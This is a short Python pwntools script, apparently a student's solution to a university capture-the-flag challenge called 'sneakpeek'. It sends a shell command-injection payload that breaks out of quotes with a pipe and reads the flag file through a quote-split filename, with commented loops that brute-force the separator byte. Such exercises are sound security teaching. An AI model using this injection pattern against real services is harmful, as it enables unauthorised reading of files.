from pwn import *
from subprocess import *

context.log_level = 'debug'

p = process("./sneakpeek") # use this to test locally first
#p = remote("cs2107-ctfd-i.comp.nus.edu.sg", "4008") # connect to the server when u have found the exploit. Change the port/IP according to challenge description.


flag = b"'|cat" + bytes(chr(32), 'ascii') + b"fla'g.txt"
print(flag)
p.sendlineafter("flag: ", flag)
print(p.recvline())

#for i in range(128):
#	flag = b"'|cat" + bytes(chr(i), 'ascii') + b"fla'g.txt"
#	print(flag)

#for i in range(128):
#	p = process("./sneakpeek")
#	flag = b"'|cat" + bytes(chr(i), 'ascii') + b"fla'g.txt"
#	print(flag)
#	p.sendlineafter("flag: ", flag)
#	print(chr(i))
	




